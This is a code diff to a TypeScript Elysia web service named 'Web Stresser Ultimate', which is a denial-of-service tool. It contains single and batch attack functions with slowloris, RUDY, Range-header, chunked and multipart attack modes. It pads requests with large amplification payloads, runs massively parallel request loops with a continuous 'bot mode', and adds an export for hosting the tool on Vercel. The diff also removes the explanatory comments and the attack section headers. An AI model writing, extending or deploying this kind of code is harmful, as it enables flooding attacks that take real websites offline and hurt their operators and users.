@@ -13,14 +13,9 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   const size = kb * 1024;
   switch (ampType) {
     case 'range':
-      // Tidak perlu body, cukup header Range
       return '';
     case 'chunked':
-      // Untuk chunked, kita return data besar yang akan dipecah
-      return 'X'.repeat(size);
     case 'multipart':
-      // Untuk multipart, kita gunakan boundary generator di bawah
-      return 'X'.repeat(size);
     default:
       return 'X'.repeat(size);
   }
@@ -35,7 +30,6 @@ setInterval(() => {
   }
 }, 30000);
 
-// ==================== Core Attack (Single) ====================
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -45,10 +39,10 @@ interface SingleAttackParams {
   retryCount: number;
   randomDelay: number;
   keepAlive: boolean;
-  attackType: string;        // normal, slowloris, rudy, range, chunked, multipart
+  attackType: string;
   amplifyKB: number;
   amplifyEnabled: boolean;
-  amplifyType: string;       // range, chunked, multipart
+  amplifyType: string;
 }
 
 async function singleAttack(params: SingleAttackParams): Promise<any> {
@@ -66,13 +60,11 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
 
   if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
 
-  // Amplification payload (jika diaktifkan)
   let ampPayload = '';
   if (amplifyEnabled && amplifyKB > 0) {
     ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
   }
 
-  // Tentukan attack type yang dipilih user (bisa berbeda dengan amplifyType)
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -98,13 +90,12 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       else finalBody = body;
       useBody = true;
       break;
-    default: // normal
+    default:
       if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
       else finalBody = body;
       useBody = true;
   }
 
-  // Jika amplification enabled dan method GET/HEAD, ubah ke POST jika payload besar
   if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
@@ -172,7 +163,6 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// ==================== Batch Attack (massive parallel) ====================
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -188,8 +178,8 @@ interface BatchAttackParams {
   amplifyType: string;
   concurrency: number;
   total: number;
-  continuous: boolean;      // untuk bot mode (loop tanpa henti)
-  intervalMs: number;       // jeda antar loop (jika continuous)
+  continuous: boolean;
+  intervalMs: number;
 }
 
 async function batchAttack(params: BatchAttackParams): Promise<any> {
@@ -249,7 +239,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     if (continuous && intervalMs > 0) {
       await new Promise(r => setTimeout(r, intervalMs));
     }
-  } while (continuous && loopCount < 9999); // limit loop untuk keamanan
+  } while (continuous && loopCount < 9999);
 
   const totalTime = Date.now() - startTime;
   const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
@@ -271,7 +261,6 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
 
 // ==================== Elysia App ====================
 export const app = new Elysia()
-  // Global error handler → tetap 200 OK
   .onError(({ error, set }) => {
     set.status = 200;
     console.error(error);
@@ -351,8 +340,12 @@ export const app = new Elysia()
     return { active: activeUsers.size };
   });
 
-// Local run
+// ==================== Local run (only in dev) ====================
 if (process.env.NODE_ENV !== 'production') {
   app.listen(3000);
   console.log('🦊 Web Stresser Ultimate running on http://localhost:3000');
 }
+
+// ==================== Vercel entrypoint (ekspor fetch) ====================
+// Untuk Vercel, kita bisa langsung ekspor app, dan Vercel akan menggunakan .fetch
+export default app;
